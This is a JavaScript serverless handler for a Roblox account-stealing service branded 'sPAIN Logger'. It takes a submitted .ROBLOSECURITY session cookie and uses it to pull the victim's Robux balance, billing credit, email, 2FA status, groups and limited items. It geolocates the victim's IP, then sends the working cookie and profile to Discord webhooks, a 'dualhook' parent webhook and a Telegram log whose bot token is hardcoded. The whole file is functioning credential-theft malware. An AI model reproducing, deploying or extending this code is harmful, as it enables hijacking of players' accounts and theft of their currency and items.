// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (json.result === null || json.result === undefined) return null;
  if (typeof json.result === 'object') return json.result;
  try { return JSON.parse(json.result); } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

// ── Cookie extract ────────────────────────────────────────────────────────────
function extractRobloxCookie(raw) {
  if (!raw) return null;
  const cleaned = raw.trim().replace(/\s+/g, ' ');
  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (fullMatch) return fullMatch[1];
  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
  return null;
}

// ── Gamepass check ────────────────────────────────────────────────────────────
async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) { return false; }
}

// ── Roblox info ───────────────────────────────────────────────────────────────
async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;

    const [profileRes, robuxRes, friendsRes, premiumRes, billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, {}),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, {}),
      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
    ]);

    const profile     = profileRes.ok     ? await profileRes.json()     : null;
    const robuxData   = robuxRes.ok       ? await robuxRes.json()        : null;
    const friendsData = friendsRes.ok     ? await friendsRes.json()      : null;
    const isPremium   = premiumRes.ok     ? await premiumRes.json()      : false;
    const billingData = billingRes.ok     ? await billingRes.json()      : null;
    const emailData   = emailRes.ok       ? await emailRes.json()        : null;
    const groupsData  = groupsRes.ok      ? await groupsRes.json()       : { data: [] };
    const limitedsData= limitedsRes.ok    ? await limitedsRes.json()     : { data: [] };
    const avatarData  = avatarRes.ok      ? await avatarRes.json()       : null;
    const tfaData     = tfaRes?.ok        ? await tfaRes.json()          : null;

    const accountAgeDays = profile?.created
      ? Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000)
      : 'N/A';

    const groups      = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    let groupRobux = 0, groupPending = 0;
    for (const group of ownedGroups.slice(0, 2)) {
      try {
        const [cr, pr] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        if (cr?.ok) { const c = await cr.json(); groupRobux += c.robux || 0; }
        if (pr?.ok) { const p = await pr.json(); groupPending += p.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0; }
      } catch (_) {}
    }

    const limiteds      = limitedsData.data || [];
    const limitedsCount = limiteds.length;
    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
    const gamepasses    = {
      mm2:       await checkGamepass(uid, '17510307', headers),
      adoptMe:   await checkGamepass(uid, '33135930', headers),
      plsDonate: await checkGamepass(uid, '12345678', headers)
    };

    return {
      id: uid, username: auth.name, displayName: auth.displayName,
      isPremium: isPremium === true, accountAgeDays,
      robux: robuxData?.robux || 0, pendingRobux: 0,
      friends: friendsData?.count || 0,
      credit: billingData?.balance || 0,
      groupsOwned: ownedGroups.length, groupRobux, groupPending,
      limitedsCount, limitedsValue,
      emailSet:      emailData?.emailAddress ? 'Set ✅'      : 'False ❌',
      emailVerified: emailData?.verified     ? 'Verified ✅' : 'Unset ❌',
      twoFA:         tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌',
      gamepasses,
      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

function field(name, value, inline = true) {
  return { name: name?.substring(0, 256), value: value?.toString()?.substring(0, 1000) || 'N/A', inline };
}

// ── Discord: VALID cookie embed ───────────────────────────────────────────────
async function sendValidEmbed(webhookUrl, { rawValue, cookie, roblox, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks') && !webhookUrl?.includes('discordapp.com/api/webhooks')) return false;
  const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
  const fields = [
    field("🔴 Robux",    `Balance: ${roblox?.robux?.toLocaleString() || 0}\nPending: ${roblox?.pendingRobux || 0}`),
    field("🎵 Rap",      `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox?.limitedsCount || 0}`),
    field("📊 Summary",  `${roblox?.accountAgeDays || 'N/A'} Days`),
    field("💳 Billing",  `Credit: ${roblox?.credit || 0} USD\nConvert: 0`),
    field("🎫 Passes",   `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`),
    field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`),
    field("👥 Groups",   `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`),
    field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
    field("🌐 IP",       ip || 'Unknown'),
    field("🎮 [EXTRA] Passes | Played",
      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}\n` +
      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}\n` +
      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`, false),
    field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
    field("🔐 .ROBLOSECURITY", `\`\`\`${cleanCookie}\`\`\``, false)
  ];
  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: `🧑 ${roblox?.username || 'Unknown'} ${roblox?.isPremium ? '⭐' : ''}`,
          description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox?.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
          color: 5793266,
          fields,
          footer: { text: `sPAIN Logger • ${now}` },
          thumbnail: { url: roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Discord: INVALID cookie embed ─────────────────────────────────────────────
async function sendInvalidEmbed(webhookUrl, { rawValue, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks') && !webhookUrl?.includes('discordapp.com/api/webhooks')) return false;
  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: `⚠️ Wrong Cookie — Someone is trolling lol`,
          description: `A submission was received but the cookie was **invalid or fake**.\nEither wrong input or someone's messing around 💀`,
          color: 0xff4444,
          fields: [
            field("🗑️ What they sent", `\`\`\`${(rawValue || '(empty)').substring(0, 900)}\`\`\``, false),
            field("🌐 IP",       ip || 'Unknown'),
            field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
            field("🗺️ ISP",      geo?.isp    || 'Unknown'),
            field("🕐 Date",     now, false)
          ],
          footer: { text: 'sPAIN Tools • Invalid Submission' },
          timestamp: now
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try { record = await redisGet(`slot:${slug}`); } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  // Grab first non-empty slot value
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const rawValue  = slotEntry ? slotEntry[1] : '';

  const cookie = extractRobloxCookie(rawValue);
  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

  const isValid = !!roblox; // valid = cookie worked and roblox responded

  const sendFn = isValid ? sendValidEmbed : sendInvalidEmbed;
  const payload = { rawValue, cookie, roblox, ip, geo, now };

  // 1. Send to this page's webhook
  await sendFn(record.webhook, payload);

  // 2. Send to dualhook parent's webhook if exists
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
        await sendFn(parentRecord.webhook, payload);
      }
    } catch (_) {}
  }

  // 3. Telegram master log
  await tgSend(isValid ? [
    `🚨 <b>NEW VALID SUBMISSION</b>`,
    `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
    `💰 Robux: ${roblox.robux?.toLocaleString()}`,
    `🍪 Cookie: ✅ Captured`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `📄 Page: ${record.displayName} (${slug})`
  ].join('\n') : [
    `⚠️ <b>INVALID/TROLL SUBMISSION</b>`,
    `📄 Page: ${record.displayName} (${slug})`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `🗑️ Sent: ${(rawValue || '(empty)').substring(0, 200)}`,
    `🕐 ${now}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
